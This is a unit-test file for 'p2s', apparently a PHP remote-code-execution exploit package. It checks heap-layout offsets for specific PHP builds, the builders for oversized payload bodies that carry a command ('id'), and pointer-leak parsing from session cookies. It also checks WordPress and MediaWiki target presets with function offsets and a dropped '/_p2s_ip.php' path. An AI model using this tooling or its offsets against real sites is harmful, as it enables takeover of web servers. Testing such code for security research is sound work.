"""Smoke tests for the clean-room p2s package (no network)."""
import os
import struct
import sys
import tempfile
import unittest
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(SRC, "src"))

from p2s import cms, geometry, proof, pure128, transport, warning  # noqa: E402


class GeometryTests(unittest.TestCase):
    def test_8m(self):
        geo = geometry.select("8.4.26", 8)
        self.assertEqual((geo.a_extra, geo.f_pads, geo.htdata_offset),
                         (0, 2, 0x690D8))

    def test_8335_128m(self):
        # docs/89 §5: 8.3.35 at 128M keeps the 8M stage-3 geometry (MediaWiki).
        geo = geometry.select("8.3.35", 128)
        self.assertEqual((geo.a_extra, geo.f_pads, geo.htdata_offset),
                         (0, 2, 0x6A0D8))

    def test_unknown_build(self):
        with self.assertRaises(geometry.GeometryError):
            geometry.select("8.4.27", 8)


class ChainShapeTests(unittest.TestCase):
    def test_a1_shape(self):
        body = warning.WarningConfig()
        self.assertEqual(body.stage3_f_pads, 2)
        self.assertFalse(body.chunked)

    def test_chunked_cms_shape(self):
        body = warning.WarningConfig(chunked=True)
        self.assertTrue(body.chunked)

    def test_pure128_a1(self):
        body = pure128.build_a1(pure128.PureConfig(cmd=b"id"))
        self.assertTrue(body.startswith(b"--" + pure128.BOUNDARY.encode()))
        self.assertIn(b'name="files[R00000', body)
        self.assertGreater(len(body), 1_000_000)

    def test_pure128_ht(self):
        ht = pure128.build_ht(0x7E0000000000, 0x7F0000000000, b"id")
        self.assertEqual(struct.unpack_from("<Q", ht, 0x30)[0],
                         0x7F0000000000)


class LeakTests(unittest.TestCase):
    def test_parse_leak(self):
        lib = 0x7F1234000000
        zdtor = lib + 0x65EB60
        main = 0x7F1200000000
        blob = bytearray()
        blob += struct.pack("<Q", zdtor) * 300
        blob += struct.pack("<Q", main + 0x1230) * 87
        cookie = urllib.parse.quote_from_bytes(bytes(blob)).encode()
        raw = (b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + cookie
               + b"\r\n\r\n")
        info = pure128.parse_leak(raw, 0x65EB60)
        self.assertIsNotNone(info)
        self.assertEqual(info["lib"], lib)
        self.assertEqual(info["main_candidates"][0], main)


class CmsTests(unittest.TestCase):
    def test_wordpress_preset(self):
        p = cms.PRESETS["wordpress"]
        self.assertEqual(p.strategy, "pure128")
        self.assertEqual(p.memory_limit_mb, 128)

    def test_mediawiki_preset(self):
        # docs/89 §5: post_max_size=8M -> chunked A, 150 workers, neutral page.
        p = cms.resolve("mediawiki")
        self.assertTrue(p.chunked)
        self.assertEqual(p.huge_mb, 132)
        self.assertEqual(p.workers, 150)
        self.assertEqual(p.dtor_offset, 0x49EC50)
        self.assertEqual(p.zif_offset, 0x3AC080)
        self.assertEqual(p.chain_path, "/_p2s_ip.php")

    def test_resolve_unknown(self):
        with self.assertRaises(KeyError):
            cms.resolve("not-a-cms")


class ProofTests(unittest.TestCase):
    def test_local_proof(self):
        ep = transport.Endpoint.parse("http://127.0.0.1:1/")
        with tempfile.NamedTemporaryFile(delete=False) as fh:
            fh.write(b"uid=33(www-data)\n")
            path = fh.name
        try:
            spec = proof.ProofSpec(local_path=path, match=b"uid=")
            self.assertTrue(spec.check(ep).startswith("uid=33"))
            spec.clear()
            self.assertEqual(spec.check(ep), "")
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass



class TransportFormDecodeTests(unittest.TestCase):
    def test_parse_set_cookie_form_plus_is_space(self):
        # php_session_reset_id() uses php_url_encode() (form encoding:
        # 0x20 -> '+'); leaked pointers containing 0x20 must decode back.
        raw = (b"HTTP/1.1 200 OK\r\n"
               b"Set-Cookie: PHPSESSID=%41+%42\x20; path=/\r\n\r\n")
        self.assertEqual(transport.parse_set_cookie(raw), b"A B\x20")


if __name__ == "__main__":
    unittest.main()
